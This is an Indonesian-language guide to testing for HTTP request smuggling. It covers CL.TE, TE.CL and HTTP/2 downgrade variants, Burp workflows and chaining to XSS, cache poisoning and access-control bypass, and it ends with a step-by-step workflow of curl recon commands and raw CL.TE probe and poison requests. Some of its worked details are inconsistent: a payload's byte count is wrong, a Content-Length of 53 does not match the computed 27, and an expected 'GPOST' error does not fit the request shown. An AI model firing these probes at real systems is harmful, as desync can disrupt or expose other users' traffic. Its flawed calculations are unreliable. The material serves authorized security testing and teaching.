## 📌 Kapan Digunakan

Chain:

```text
Smuggling
   ↓
FE bypass
   ↓
open redirect endpoint
   ↓
redirect
```

Contoh vulnerable endpoint:

```text
/redirect?next=/home
```

Lab request:

```http
GET /redirect?next=/lab-success HTTP/1.1
Host: lab.local

```

Smuggling dapat berguna jika:

```text
FE blocks external redirect
```

tetapi backend memprosesnya.

---

# 3.6 Web Cache Poisoning via Smuggling

## 📌 Kapan Digunakan

Gunakan ketika terdapat kombinasi:

```text
request smuggling
+
shared cache
```

Flow:

```text
Attacker
   ↓
Smuggled Request
   ↓
Backend
   ↓
Unexpected Response
   ↓
Cache
   ↓
Next User
```

---

## Mental Model

```text
Normal:

GET /home
      ↓
Backend
      ↓
Response
      ↓
Cache
```

Smuggling:

```text
Request A
   ↓
desync
   ↓
Request B interpreted unexpectedly
   ↓
malicious/incorrect response
   ↓
Cache stores it
```

---

## Hal Yang Harus Dicek

```text
Cache-Control
Age
ETag
X-Cache
Via
CDN headers
```

Tetapi header tersebut berbeda menurut stack.

---

# 🌐 4. HTTP/2 SMUGGLING

## 🔍 Cara Cek Apakah Target Support HTTP/2

Sebelum menguji HTTP/2 smuggling, verifikasi apakah target mendukung HTTP/2:

```bash
# Method 1: curl check ALPN / H2 support
curl -sI --http2 https://TARGET 2>&1 | grep -E "HTTP/2|h2|alpn"

# Output jika H2 didukung:
# HTTP/2 200

# Method 2: nmap SSL script
nmap -sV -p 443 --script ssl-enum-ciphers TARGET

# Method 3: Burp Repeater Protocol Toggle
# Lihat di pojok kanan bawah Burp Repeater: "HTTP/1" atau "HTTP/2".
# Anda dapat men-toggle protocol ini secara manual untuk menguji behavior H1 vs H2.
```

---

# 4.1 H2.CL

## 📌 Kapan Digunakan

Ketika:

```text
Client → H2
FE → H2
FE → downgrade
BE → H1
```

dan terdapat:

```text
Content-Length
```

yang dipertahankan selama downgrade.

---

## Concept

```text
HTTP/2
  │
  │ request
  ▼
H2 Front-End
  │
  │ downgrade
  ▼
HTTP/1.1
  │
  │ Content-Length
  ▼
Back-End
```

Periksa:

```text
Does H2 body length
match generated H1 Content-Length?
```

Jika tidak:

```text
H2 framing ≠ H1 framing
```

---

# H2.CL Payload Concept

Gunakan concept sebagai berikut:

```text
HTTP/2 request
   ↓
body length metadata
   ↓
Content-Length mismatch
   ↓
downgrade
   ↓
HTTP/1.1 backend
```

Jangan mulai dengan exploit.

Mulai dengan:

```text
1. identify H2
2. inspect downgrade
3. compare H1 representation
4. test mismatch
5. observe differential
```

---

# 4.2 H2.TE

## 📌 Kapan Digunakan

Cari ketika:

```text
HTTP/2
   ↓
header handling
   ↓
downgrade
   ↓
HTTP/1.1
```

dan terdapat kemungkinan:

```text
Transfer-Encoding
```

dibawa secara tidak semestinya ke H1 backend.

---

## Header Injection Concept

HTTP/2 menggunakan binary framing.

Anda tidak sekadar:

```text
paste raw H1 request
```

karena transport layer berbeda.

Burp dapat membantu melihat bagaimana H2 diterjemahkan.

---

# 4.3 Detection H2 Smuggling

Tools:

```text
Burp Suite
HTTP Request Smuggler
HTTP/2 Repeater support
```

---

## Burp H2 Workflow

```text
Proxy
   ↓
capture HTTPS request
   ↓
inspect HTTP version
   ↓
Send to Repeater
   ↓
HTTP/2 toggle
   ↓
modify relevant headers/body
   ↓
compare H2 vs H1
```

---

## Compare Matrix

|Test|Protocol|Result|
|---|---|---|
|A|H2 normal|200|
|B|H1 normal|200|
|C|H2 altered|200|
|D|H1 altered|408|
|E|H2 downgrade|502|

Pola tersebut kemudian dianalisis.

---

# 🛠️ 5. BURP SUITE WORKFLOW

# 5.1 Setup

## 📌 Kapan Digunakan

Jadikan Burp tool utama untuk:

```text
manual testing
automation
HTTP/1.1
HTTP/2
request comparison
```

---

## Install Extension

```text
Burp Suite
   ↓
Extensions
   ↓
BApp Store
   ↓
HTTP Request Smuggler
   ↓
Install
```

---

## Scope Target

Sebelum testing:

```text
Proxy
   ↓
Target
   ↓
Scope
```

Masukkan hanya target lab.

Contoh:

```text
https://lab.local
```

---

# Capture Request Yang Tepat

Pilih request yang:

```text
- HTTP/1.1
- keep-alive
- POST/PUT/other body-capable methods
- melalui proxy/load balancer
```

Target menarik:

```text
/login
/api/
/
/search
/upload
```

Tetapi jangan menganggap path tertentu otomatis vulnerable.

---

# 5.2 Manual CL.TE Test di Burp

## Step 1

Capture request normal:

```http
POST / HTTP/1.1
Host: lab.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Connection: keep-alive

hello
```

Send to Repeater.

---

## Step 2

Ubah menjadi:

```http
POST / HTTP/1.1
Host: lab.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked
Connection: keep-alive

0

```

---

## Step 3

Pastikan:

```text
HTTP/1.1
```

bukan:

```text
HTTP/2
```

jika Anda sedang melakukan CL.TE klasik.

---

## Step 4

Observe:

```text
status
response time
connection behavior
```

---

# Chunked Body

Format:

```text
5\r\n
HELLO\r\n
0\r\n
\r\n
```

Dalam Burp tampak sebagai:

```text
5
HELLO
0
```

Tetapi secara byte:

```text
5\r\nHELLO\r\n0\r\n\r\n
```

---

## Step 5 — Control

Kirim request normal lagi.

Bandingkan:

```text
normal
vs
probe
vs
normal
```

Tujuan:

```text
A-B-A test
```

---

# 5.3 Automated Scan

## 📌 Kapan Digunakan

Gunakan automated scanning setelah:

```text
target scope sudah benar
request sudah dipahami
```

---

## Workflow

```text
Target
  ↓
Request Smuggler
  ↓
scan
  ↓
timing indicators
  ↓
differential checks
  ↓
manual validation
```

---

## Interpretasi

Misalnya:

```text
Potential CL.TE desync
```

Treat as:

```text
POTENTIAL
```

bukan:

```text
CONFIRMED
```

Kemudian:

```text
Manual Repeater
        ↓
Control request
        ↓
Repeat
        ↓
Confirm
```

---

# 🎯 6. DECISION TREE

```text
START
  │
  ▼
Apakah target punya FE + BE?
  │
  ├── NO ──► Smuggling unlikely
  │
  └── YES
       │
       ▼
Apakah HTTP/1.1?
       │
       ├── YES
       │    │
       │    ▼
       │  Test CL/TE
       │    │
       │    ├──────────────┐
       │    │              │
       │    ▼              ▼
       │  CL.TE          TE.CL
       │    │              │
       │    ▼              ▼
       │ timing        timing
       │ differential  differential
       │    │              │
       │    └──────┬───────┘
       │           ▼
       │      TE.TE variants
       │           │
       │           ▼
       │      Manual confirm
       │
       └── NO / H2
            │
            ▼
       HTTP/2 enabled?
            │
            ├── NO → Check H1 stack
            │
            └── YES
                  │
                  ▼
             H2 downgrade?
                  │
                  ├── NO
                  │
                  └── YES
                       │
                       ▼
                    H2.CL
                       │
                       ▼
                    H2.TE
                       │
                       ▼
                 Manual confirm
                       │
                       ▼
                 Vulnerable?
                    /    \
                  NO      YES
                  │        │
                  ▼        ▼
               Stop    Identify FE control
                           │
             ┌─────────────┼─────────────┐
             ▼             ▼             ▼
          Access         XSS          Cache
          Control                     Poisoning
             │             │             │
             └─────────────┼─────────────┘
                           ▼
                      Safe lab exploit
```

---

# 🧭 Detection Decision Tree

```text
Response delayed?
      │
      ├── NO
      │    ↓
      │  Try differential
      │    ↓
      │  Try TE variants
      │    ↓
      │  Inspect H2/H1
      │
      └── YES
           ↓
      Repeat 3x
           │
           ├── inconsistent
           │      ↓
           │   likely noise
           │
           └── consistent
                  ↓
              baseline control
                  ↓
              manual confirm
```

---

# 🧯 7. COMMON ERRORS & TROUBLESHOOTING

|Error|Sebab|Solusi|
|---|---|---|
|Timing tidak menunjukkan delay|Target tidak vulnerable atau parser sama|Bandingkan CL.TE dan TE.CL, lalu baseline ulang|
|Response tidak menunjukkan perbedaan|Tidak terjadi desync yang observable|Gunakan timing atau differential probe|
|Connection langsung close|Proxy/server menolak request|Periksa `Connection`, malformed framing, HTTP version|
|`400 Bad Request`|Parsing request invalid|Hitung CRLF dan Content-Length dengan teliti|
|`502 Bad Gateway`|Proxy gagal berkomunikasi dengan backend|Menarik, tetapi belum bukti vulnerability|
|CL calculation salah|Byte count tidak sesuai|Hitung byte literal, termasuk CRLF|
|Chunk format salah|Chunk size salah|Gunakan hexadecimal dan format `size\r\nbody\r\n`|
|Burp extension tidak detect apa-apa|Request salah atau target tidak sesuai|Coba request POST HTTP/1.1 yang sederhana|
|HTTP/2 tidak bisa di-test|Target hanya H1 atau Burp negotiation berbeda|Verifikasi protocol negotiation|
|`421 Misdirected Request`|Host/connection routing mismatch|Coba koneksi baru dan host yang benar|
|Timeout setiap request|Backend memang lambat|Buat baseline beberapa request|
|Timeout hanya sekali|Network noise|Ulangi minimal 3 kali|
|Request kedua error|Connection poisoned|Reset connection lalu ulangi controlled test|
|Smuggled request tidak masuk|Boundary tidak benar|Recalculate CL/chunk framing|
|TE.TE variant tidak berpengaruh|FE/BE melakukan canonicalization|Uji variant lain|
|`Transfer-Encoding` dihapus|Proxy melakukan normalization|Fokus pada layer setelah normalization|
|H2 payload tidak bekerja|H2 parser menolak header|Gunakan Burp H2 mode|
|curl menghasilkan hasil berbeda|curl/library memproses framing|Gunakan Burp/raw socket|
|Browser request berubah|Browser memilih H2|Force H1 pada lab jika diperlukan|
|Burp response hang|Connection menunggu boundary|Reset connection setelah timeout|
|Payload valid tetapi 200|Tidak ada exploitability|Cari evidence desync lainnya|
|`401 Unauthorized`|Authentication tidak valid/missing|Gunakan lab credential yang valid untuk next-stage test|
|`403 Forbidden`|Request ditolak server|Periksa apakah FE atau BE yang menghasilkan response|
|`408 Request Timeout`|Parser waiting atau timeout normal|Bandingkan baseline|
|`413 Payload Too Large`|Body size rejected|Gunakan body kecil dan valid|
|`429 Too Many Requests`|Rate limit|Kurangi frequency dan gunakan lab|
|Response berbeda tiap kali|Shared connection state|Reset connection lalu jalankan A-B-A|
|Cache berubah setelah probe|Potensi cache interaction|Uji dengan cache headers|
|Open redirect tidak ter-trigger|Redirect endpoint tidak menerima payload|Uji endpoint normal lebih dahulu|
|XSS tidak execute|Context/filter berbeda|Analisis XSS context menggunakan file XSS|
|Capture endpoint kosong|Poison belum berhasil|Tes capture endpoint secara normal|
|Front-end menolak duplicate TE|Canonicalization ketat|Uji HTTP/2 downgrade atau stack lain|
|Request kedua menjadi 400|Partial parsing|Sesuaikan boundary berdasarkan raw bytes|
|Scan terlalu noisy|Banyak request tanpa kontrol|Kurangi scope dan gunakan manual confirmation|

---

# 🧠 8. GOLDEN RULES

## Rule 01 — Pahami Parser

Jangan mulai dengan payload.

Mulai dengan:

```text
Siapa FE?
Siapa BE?
Parser apa?
```

---

## Rule 02 — CL ≠ TE

Core mindset:

```text
Content-Length
        vs
Transfer-Encoding
```

---

## Rule 03 — Baseline Wajib

Sebelum probe:

```text
normal request
```

harus sudah diketahui.

---

## Rule 04 — Timeout Bukan Bukti Tunggal

```text
Timeout
≠
Smuggling confirmed
```

---

## Rule 05 — Repeatability Sangat Penting

Sinyal kuat:

```text
same payload
same target
same behavior
```

---

## Rule 06 — Control Payload

Selalu punya:

```text
baseline
probe
control
```

---

## Rule 07 — Jangan Tebak Content-Length

Hitung:

```text
byte
```

bukan:

```text
character visual
```

---

## Rule 08 — CRLF Itu Penting

HTTP/1.1 framing bergantung pada:

```text
\r\n
```

bukan sekadar Enter biasa.

---

## Rule 09 — Pastikan Protocol

Bedakan:

```text
H1
H2
```

sebelum testing.

---

## Rule 10 — FE vs BE

Pertanyaan utama:

```text
FE melihat apa?
BE melihat apa?
```

---

## Rule 11 — Shared Connection = Risiko

Jika connection reused:

```text
desync
→
other request
```

mungkin terjadi.

---

## Rule 12 — Reset Connection Setelah Probe Berbahaya

Setelah eksperimen:

```text
close connection
```

agar state tidak mengganggu test berikutnya.

---

## Rule 13 — Jangan Uji Data Nyata

Gunakan:

```text
dummy account
dummy token
dummy endpoint
```

---

## Rule 14 — Automated Tool Bukan Hakim

Tool berkata:

```text
potential
```

Anda yang melakukan:

```text
manual confirmation
```

---

## Rule 15 — HTTP/2 Bukan Otomatis Aman

Selalu pikir:

```text
H2
 ↓
downgrade?
 ↓
H1?
```

---

## Rule 16 — Smuggling = Boundary Problem

Jangan menghafal payload saja.

Hafalkan:

```text
Boundary
Parser
Connection
```

---

# ✅ 9. FINAL CHECKLIST

## Recon

-  Target sudah masuk scope legal
    
-  FE teridentifikasi
    
-  BE teridentifikasi bila memungkinkan
    
-  Proxy/CDN/WAF dicatat
    
-  HTTP version dicatat
    
-  Request reuse dipahami
    
-  Connection behavior dicatat
    
-  Endpoint yang relevan dipilih
    

## HTTP/1.1

-  Baseline request dikirim
    
-  Response time dicatat
    
-  CL behavior diuji
    
-  TE behavior diuji
    
-  CL.TE diuji
    
-  TE.CL diuji
    
-  TE.TE diuji
    
-  Content-Length dihitung manual
    
-  Chunk size dihitung benar
    
-  CRLF diperiksa
    
-  Response dibandingkan
    
-  Probe diulang minimal 3 kali
    

## Validation

-  False positive disingkirkan
    
-  Control payload diuji
    
-  Connection state diperhatikan
    
-  Burp manual confirmation dilakukan
    
-  Automated result dikonfirmasi
    
-  H1/H2 dibandingkan bila relevan
    

## Exploitation

-  FE security control dipahami
    
-  BE endpoint diverifikasi di lab
    
-  Synthetic request digunakan
    
-  Synthetic data digunakan
    
-  Capture endpoint dimiliki sendiri
    
-  XSS chaining diuji hanya di lab
    
-  Open redirect chaining diuji di lab
    
-  Cache behavior diuji di lab
    

## Safety

-  Tidak menguji production tanpa izin eksplisit
    
-  Tidak menggunakan real victim session
    
-  Tidak mengambil token user nyata
    
-  Connection di-reset setelah test
    
-  Tidak melakukan destructive action
    
-  Semua bukti dibuat pada target authorized
    

---

# 🔗 10. CROSS-WORKFLOW

## HTTP Smuggling ↔ XSS

```text
Smuggling
   ↓
FE bypass
   ↓
XSS endpoint
   ↓
Reflected/Stored XSS
```

Referensi:

← [File 20: XSS](/docs/xss)

### Gunakan ketika

```text
XSS filter ada di FE
```

tetapi:

```text
backend tetap vulnerable
```

---

# HTTP Smuggling ↔ Cache Poisoning

```text
Smuggling
   ↓
backend interpretation
   ↓
cacheable response
   ↓
cache
   ↓
next user
```

Fokus:

```text
request key
Host
path
headers
cache normalization
```

---

# HTTP Smuggling ↔ Access Control

```text
FE access control
       ↓
     bypass
       ↓
BE internal endpoint
       ↓
BOLA/BFLA/ACL issue
```

Referensi:

← [File 30: API Security](/docs/api-security)

Perhatian:

```text
FE bypass
≠
authorization bypass otomatis
```

Anda tetap harus membuktikan:

```text
BE tidak melakukan authorization
```

---

# HTTP Smuggling ↔ Open Redirect

```text
Smuggling
   ↓
reach redirect endpoint
   ↓
redirect behavior
   ↓
chain
```

Referensi konseptual:

← [File 20: XSS](/docs/xss)

---

# HTTP Smuggling ↔ SSRF

Stack tertentu dapat menyediakan:

```text
proxy
   ↓
backend routing
   ↓
internal service
```

Smuggling dapat menjadi primitive tambahan untuk mencapai endpoint yang normalnya tidak melewati FE.

Untuk SSRF:

← [File 22: SSRF](/docs/ssrf)

---

# HTTP Smuggling ↔ CSRF

Beberapa exploit chain melibatkan:

```text
smuggled request
   ↓
state-changing endpoint
```

Tetapi:

```text
Smuggling ≠ CSRF
```

Ini adalah dua primitive berbeda.

Untuk CSRF:

← [File 29: CSRF](/docs/csrf)

---

# HTTP Smuggling ↔ API Security

API sering berada di belakang:

```text
CDN
WAF
API Gateway
Load Balancer
Reverse Proxy
Application Server
```

Sehingga parser chain bisa menjadi:

```text
Client
 ↓
CDN
 ↓
WAF
 ↓
API Gateway
 ↓
Proxy
 ↓
App
```

Semakin kompleks chain:

```text
semakin penting
memahami request boundary
```

Untuk konteks API:

← [File 30: API Security](/docs/api-security)

---

# 🧠 11. ONE-LINE MUSCLE MEMORY

```text
HTTP Smuggling = cari FE ↔ BE parser mismatch → baseline → CL.TE → TE.CL → TE.TE → timing/differential confirmation → pahami shared connection → validasi manual → baru chain ke access control/XSS/cache/open redirect pada lab.
```

---

# 🧩 ULTRA-SHORT MUSCLE MEMORY

```text
FE lihat apa?
BE lihat apa?
CL atau TE?
H1 atau H2?
Boundary beda?
Connection desync?
Delay repeatable?
Response differential?
Confirm di Burp.
Exploit hanya di lab.
```

---

# 🧪 QUICK REFERENCE

## CL.TE

```text
FE = CL
BE = TE
```

```text
CL.TE
 ↓
FE boundary
 ≠
BE boundary
```

---

## TE.CL

```text
FE = TE
BE = CL
```

```text
TE.CL
 ↓
FE boundary
 ≠
BE boundary
```

---

## TE.TE

```text
FE = TE
BE = TE

tetapi

FE parser ≠ BE parser
```

---

## Chunk Format

```text
[hex size]\r\n
[data]\r\n
0\r\n
\r\n
```

Contoh:

```text
5\r\nHELLO\r\n0\r\n\r\n
```

---

## Detection

```text
Baseline
   ↓
Probe
   ↓
Timing
   ↓
Repeat
   ↓
Differential
   ↓
Manual confirm
```

---

## Exploitation

```text
Desync
  ↓
FE bypass
  ↓
BE endpoint
  ↓
XSS / Access Control / Redirect / Cache
```

---

# 🏁 FINAL MINDSET

Jangan menghafal:

```text
"payload CL.TE"
"payload TE.CL"
```

Hafalkan konsep:

```text
             REQUEST
                │
                ▼
        +---------------+
        |     FE        |
        | parser A      |
        +-------+-------+
                │
                │ shared connection
                ▼
        +---------------+
        |     BE        |
        | parser B      |
        +-------+-------+
                │
                ▼
           APPLICATION
```

Pertanyaan selalu:

```text
1. FE menggunakan framing apa?
2. BE menggunakan framing apa?
3. Apakah keduanya menghasilkan boundary sama?
4. Apakah connection reused?
5. Apakah discrepancy dapat direproduksi?
6. Apa security control yang hanya ada di FE?
7. Apa endpoint BE yang dapat dicapai?
8. Apa impact paling aman untuk dibuktikan di lab?
```

> **Golden mental model:**

```text
HTTP Request Smuggling
        =
Parser Mismatch
        +
Boundary Mismatch
        +
Connection Reuse
        ↓
Desynchronization
        ↓
Unexpected Request Interpretation
```

---

# 31 — HTTP Request Smuggling: Complete Interactive Workflow 🧨

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL ✅** dan **OUTPUT GAGAL/BERBEDA ❌**. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="https://lab.target.com"
export TARGET_HOST="lab.target.com"
export LHOST="10.10.14.5"

mkdir -p ~/smuggling_loot/{requests,responses,notes}
cd ~/smuggling_loot

echo "[*] Target: $TARGET"
echo "[*] Tool utama: Burp Suite + HTTP Request Smuggler extension"
```

**Output yang diharapkan:**

text

```
[*] Target: https://lab.target.com
[*] Tool utama: Burp Suite + HTTP Request Smuggler extension
```

> ⚠️ **CRITICAL WARNING:** HTTP Request Smuggling dapat mempengaruhi user lain di shared backend connection. **JANGAN** test di production tanpa izin eksplisit. Gunakan lab environment (PortSwigger, HTB, THM).

---

## ═══════════════════════════════════════

## FASE 0: RECONNAISSANCE — IDENTIFIKASI STACK

## ═══════════════════════════════════════

### Langkah 0.1 — Deteksi HTTP Version & Stack

Bash

```
# Command 1: Cek HTTP version support
curl -sI --http2 $TARGET 2>&1 | head -20

# Command 2: Cek headers yang revealed stack info
curl -sI $TARGET | grep -iE "(server|via|x-powered-by|x-cache|cf-ray|x-amz|fastly|x-varnish|age)"

# Command 3: Cek ALPN / H2 support lebih detail
nmap -sV -p 443 --script ssl-enum-ciphers $TARGET_HOST 2>/dev/null | grep -iE "(h2|alpn|http)"

# Command 4: Identifikasi CDN/Proxy dari headers
curl -sI $TARGET | grep -iE "(cloudflare|akamai|fastly|aws|nginx|apache|iis|haproxy)"
```

**OUTPUT BERHASIL ✅ — HTTP/2 supported:**

text

```
HTTP/2 200
server: nginx/1.18.0
via: 1.1 varnish
x-cache: HIT
```

**Cara baca output ini:**

|Header|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`HTTP/2 200`|Protocol H2|Target support H2 → Test H2.CL dan H2.TE di fase 4|
|`via: varnish`|Proxy teridentifikasi|Ada FE proxy → potential parser mismatch|
|`x-cache: HIT`|Cache aktif|Ada caching layer → potential cache poisoning via smuggling|
|`server: nginx`|Backend server|Catat untuk menentukan parser behavior|
|`cf-ray: ...`|Cloudflare CDN|Multi-layer proxy → lebih besar kemungkinan desync|

**OUTPUT BERHASIL ✅ — HTTP/1.1 only:**

text

```
HTTP/1.1 200 OK
server: Apache/2.4.41
```

➡️ Target hanya HTTP/1.1. Focus ke CL.TE, TE.CL, TE.TE klasik. Skip Fase 4.

**OUTPUT GAGAL ❌ — Tidak ada proxy header:**

text

```
HTTP/1.1 200 OK
server: nginx
```

➡️ Mungkin single server. Smuggling less likely tapi tetap test. Cek lebih dalam dengan Langkah 0.2.

---

### Langkah 0.2 — Identifikasi Arsitektur FE/BE

Bash

```
# Command 1: Cek response headers yang menunjukkan proxy chain
curl -sv $TARGET 2>&1 | grep -E "^[<>]" | head -40

# Command 2: Test dengan invalid HTTP untuk melihat error source
curl -sk --http1.1 -X INVALID $TARGET -o /dev/null -w "%{http_code}\n"

# Command 3: Cek apakah ada FE yang meng-inject headers
curl -sk $TARGET -H "X-Custom-Test: probe123" -v 2>&1 | grep -iE "(forwarded|real-ip|original)"

# Command 4: Traceroute HTTP untuk identify layers
curl -sk $TARGET/nonexistent -v 2>&1 | grep -iE "(location|server|via|forwarded)"
```

**OUTPUT BERHASIL ✅ — Stack teridentifikasi (ada FE+BE):**

text

```
< via: 1.1 proxy.internal
< x-forwarded-for: 10.0.0.1
< x-forwarded-host: lab.target.com
```

➡️ **Ada FE + BE chain!** Smuggling highly likely. Catat info:

Bash

```
# Simpan info stack
cat > ~/smuggling_loot/notes/stack_info.txt << 'EOF'
FE: nginx/varnish (dari via header)
BE: Apache/App server
Protocol: HTTP/2 support confirmed
Cache: YES (x-cache present)
Signing: N/A (web)
EOF
echo "[+] Stack info disimpan"
```

**OUTPUT GAGAL ❌ — Single server, tidak ada proxy indicator:**

text

```
HTTP/1.1 200 OK
server: Apache/2.4.41
(tidak ada via, x-forwarded, dll)
```

➡️ Single server setup. Smuggling sangat unlikely. Tapi tetap lanjut Langkah 0.3 untuk konfirmasi.

---

### Langkah 0.3 — Setup Burp Suite (WAJIB untuk HTTP Smuggling)

text

```
Burp Suite Setup:
1. Buka Burp Suite Professional/Community
2. Extensions → BApp Store → cari "HTTP Request Smuggler" → Install
3. Proxy → Options → pastikan listening di 127.0.0.1:8080
4. Target → Scope → Add → masukkan TARGET_HOST
5. Browser → set proxy ke 127.0.0.1:8080
6. Kunjungi target → pastikan traffic masuk di Proxy → HTTP History
```

**Verifikasi Burp berjalan:**

Bash

```
# Test Burp proxy aktif
curl -sk --proxy 127.0.0.1:8080 $TARGET -o /dev/null -w "Proxy: %{http_code}\n"

# Baseline timing via curl (untuk referensi saja, bukan untuk smuggling test)
curl -sk -o /dev/null \
  -w "time_total=%{time_total}\n" \
  $TARGET
```

**OUTPUT BERHASIL ✅:**

text

```
Proxy: 200
time_total=0.234
```

> 📌 **CATAT baseline timing:** ~0.234s. Ini referensi kita.

**OUTPUT GAGAL ❌ — Proxy tidak respond:**

text

```
curl: (7) Failed to connect to 127.0.0.1 port 8080
```

➡️ Burp belum berjalan atau port salah. Cek Burp → Proxy → Options.

---

## ═══════════════════════════════════════

## FASE 1: BASELINE MEASUREMENT

## ═══════════════════════════════════════

> **Tujuan:** Sebelum probe apapun, WAJIB punya baseline yang solid. Ini yang membedakan true positive dari noise.

### Langkah 1.1 — Ambil Baseline Response Time (5-10 requests)

Bash

```
# Command 1: Ambil 10 baseline measurements
for i in {1..10}; do
  TIME=$(curl -sk -o /dev/null \
    -w "%{time_total}" \
    --http1.1 \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Content-Length: 5" \
    --data "hello" \
    $TARGET)
  echo "Request $i: ${TIME}s"
done

# Command 2: Hitung statistik baseline
# Dari output di atas, catat min/max/average secara manual atau:
for i in {1..5}; do
  curl -sk -o /dev/null \
    -w "time=%{time_total} code=%{http_code}\n" \
    --http1.1 -X POST $TARGET \
    -H "Content-Length: 5" --data "hello"
done
```

**OUTPUT BERHASIL ✅ — Baseline stabil:**

text

```
Request 1: 0.112s
Request 2: 0.118s
Request 3: 0.115s
Request 4: 0.121s
Request 5: 0.113s
Request 6: 0.119s
Request 7: 0.114s
Request 8: 0.116s
Request 9: 0.112s
Request 10: 0.117s
```

➡️ Baseline ≈ **110-120ms**. Simpan ini. Nanti delay >3-5x baseline = interesting.

**OUTPUT BERHASIL ✅ — Baseline tidak stabil (noisy):**

text

```
Request 1: 0.112s
Request 3: 1.204s  ← spike
Request 5: 0.115s
Request 7: 2.341s  ← spike
```

➡️ Network noisy atau server inconsistent. **Smuggling timing-based detection akan sulit.** Fokus ke **differential response detection** instead. Catat variability ini.

**OUTPUT GAGAL ❌ — Semua request timeout:**

text

```
Request 1: 30.000s
Request 2: 30.000s
```

➡️ Server sangat lambat atau connection issues. Cek koneksi basic dulu.

---

### Langkah 1.2 — Identify Endpoint Yang Tepat untuk Testing

Bash

```
# Command 1: Temukan POST endpoint yang ada di target
# Cari form, login, search, upload di source HTML
curl -sk $TARGET | grep -iE "(action|method=.post|api/)" | head -20

# Command 2: Cek common POST endpoints
for path in "/" "/login" "/search" "/api/" "/api/v1/" "/upload"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --http1.1 -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Content-Length: 5" \
    --data "test=" \
    "$TARGET$path")
  echo "$path → $CODE"
done

# Command 3: Dari Burp, pilih request yang:
# - HTTP/1.1
# - POST/PUT (punya body)
# - keep-alive connection
# - melewati proxy/load balancer
```

**OUTPUT BERHASIL ✅ — Endpoint POST ditemukan:**

text

```
/ → 200
/login → 200
/search → 200
/api/ → 404
/upload → 405
```

➡️ Target `POST /` dan `POST /search` sebagai primary test endpoint. Yang terbaik adalah endpoint yang:

1. Return 200 untuk request normal
2. Menerima body
3. Ada di balik proxy

> 📌 **Di Burp:** Pilih salah satu request POST ini → klik kanan → "Send to Repeater". Ini akan jadi workspace utama kita.

---

## ═══════════════════════════════════════

## FASE 2: CL.TE DETECTION

## ═══════════════════════════════════════

> **Skenario:** FE menggunakan `Content-Length`, BE menggunakan `Transfer-Encoding`

### Langkah 2.1 — CL.TE Timing Probe (via Burp Repeater)

**SETUP DI BURP REPEATER:**

Di Burp Repeater, pastikan:

- Protocol: **HTTP/1** (bukan HTTP/2)
- "Update Content-Length" di-**UNCHECK** (penting!)

**Request probe CL.TE — kirim di Burp Repeater:**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

0
```

> ⚠️ **Kenapa CL: 4?** Body adalah `0\r\n\r\n` = 5 byte TAPI kita kirim CL: 4 (sengaja kurang 1 byte = tidak ada `\n` terakhir). FE yang pakai CL akan forward 4 byte. BE yang pakai TE akan menunggu terminator `0\r\n\r\n` yang lengkap → **HANG/delay**.

**Cara hitung Content-Length:**

text

```
Body actual: 0\r\n\r\n = 5 byte
CL untuk delay: 4 (kurang satu \n terakhir)
CL untuk normal: 5 (lengkap, tidak delay)
```

**OUTPUT BERHASIL ✅ — DELAY SIGNIFIKAN (CL.TE vulnerable!):**

text

```
Response time: ~10 seconds (atau sampai timeout)
HTTP/1.1 408 Request Timeout
atau
HTTP/1.1 200 OK (setelah delay panjang)
```

➡️ **STRONG SIGNAL!** BE menunggu terminator chunk yang tidak pernah datang. Lanjut ke **Langkah 2.2** untuk konfirmasi.

**Harus diulang 3x untuk konfirmasi:**

text

```
Test 1: 10.01s ← significant
Test 2: 9.98s  ← significant
Test 3: 10.02s ← significant
→ CONSISTENT = TRUE POSITIVE
```

**OUTPUT GAGAL ❌ — Tidak ada delay (response normal ~baseline):**

text

```
Response time: 0.115s
HTTP/1.1 200 OK
```

➡️ FE dan BE pakai framing yang sama, atau FE strip TE header. Lanjut ke **Fase 3 (TE.CL)**.

**OUTPUT GAGAL ❌ — Delay sekali-sekali (inconsistent):**

text

```
Test 1: 0.112s  ← normal
Test 2: 8.234s  ← delay
Test 3: 0.119s  ← normal
```

➡️ Kemungkinan network noise atau CDN behavior. Lakukan kontrol test dengan CL:5 (complete):

Bash

```
# Control request — HARUS tidak delay
# Di Burp Repeater, ubah CL: 5 (complete body)
# Kirim 3x, semua harus ~baseline
```

**Google jika buntu:**

text

```
search: "CL.TE smuggling [server name] [nginx/apache/haproxy]"
search: "http request smuggling [target technology] site:portswigger.net"
search: "http desync [specific error message you got]"
```

---

### Langkah 2.2 — CL.TE Differential Response Confirmation

> Setelah timing probe positif, konfirmasi dengan differential response — ini lebih kuat sebagai bukti.

**Di Burp Repeater, buka 2 tabs:**

**Tab 1 — Poison Request (kirim dulu):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked
Connection: keep-alive

e
q=smuggling_test
0
```

> 📌 Hitung CL: `e\r\nq=smuggling_test\r\n0\r\n\r\n`
> 
> - `e` = 1 byte + `\r\n` = 2 byte = 3
> - `q=smuggling_test` = 17 byte + `\r\n` = 2 = 19
> - `0` = 1 + `\r\n` = 2 = 3
> - `\r\n` = 2
> - Total chunked body: 27 byte
> - PLUS header prefix yang kita smuggle...
> 
> **Praktisnya: Di Burp, gunakan "Update Content-Length" untuk kalkulasi, lalu manually adjust untuk smuggle.**

**Tab 2 — Follow-up Normal Request (kirim segera setelah Tab 1):**

http

```
POST /search HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: keep-alive

search=test
```

**OUTPUT BERHASIL ✅ — Differential response (follow-up request mendapat response aneh):**

text

```
Tab 2 response:
HTTP/1.1 400 Bad Request
"Unrecognized method GPOST"
atau
HTTP/1.1 404 Not Found (untuk path yang sebenarnya valid)
atau
Response berisi konten yang tidak sesuai dengan /search
```

